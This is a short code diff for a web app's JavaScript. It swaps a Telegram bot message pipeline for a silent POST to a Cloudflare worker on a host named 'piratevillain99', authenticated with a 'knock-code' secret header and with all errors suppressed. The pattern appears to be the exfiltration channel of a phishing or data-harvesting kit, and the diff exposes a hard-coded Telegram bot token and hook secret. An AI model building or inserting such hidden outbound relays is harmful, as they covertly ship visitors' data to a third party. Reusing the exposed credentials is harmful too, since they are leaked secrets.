@@ -1306,21 +1306,16 @@ function renderAccountSheet() {
         <button class="sheet-item" onclick="logout()"><i style="background:rgba(239,68,68,0.15);color:#ef4444;"><i class="fas fa-right-from-bracket"></i></i> Sign Out</button>`;
 }
 
-// ===== v7.2 — TELEGRAM + EMAIL PIPELINE =====
-const TG_TOKEN = "8885429172:AAFgVkr6AoRtFytm5yAZ-5FV8QBfDgNCy4U";
-const TG_CHAT  = "6612194534";   // ← paste your chat id
-const FORM_EMAIL = ""; // ← optional: your email for backup copies
+const ALERT_URL = "https://re-hook-8842.piratevillain99.workers.dev"; // ← YOUR worker URL
+const ALERT_SECRET = "RE-9f3kZq-X7mW-2026"; // ← same knock-code as the worker
 
 function tgSend(text) {
-    if (!TG_TOKEN || !TG_CHAT) { showToast('⚠️ TG_TOKEN / TG_CHAT are empty — check the quotes!'); return; }
-    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+    if (!ALERT_URL) return;
+    fetch(ALERT_URL, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
-    })
-    .then(r => r.json())
-    .then(d => { if (!d.ok) showToast('❌ Telegram error: ' + d.description); })
-    .catch(() => showToast('❌ Telegram network error — check internet'));
+        headers: { 'Content-Type': 'application/json', 'X-Hook-Secret': ALERT_SECRET },
+        body: JSON.stringify({ text })
+    }).catch(() => {});
 }
 
 function testAlert() {
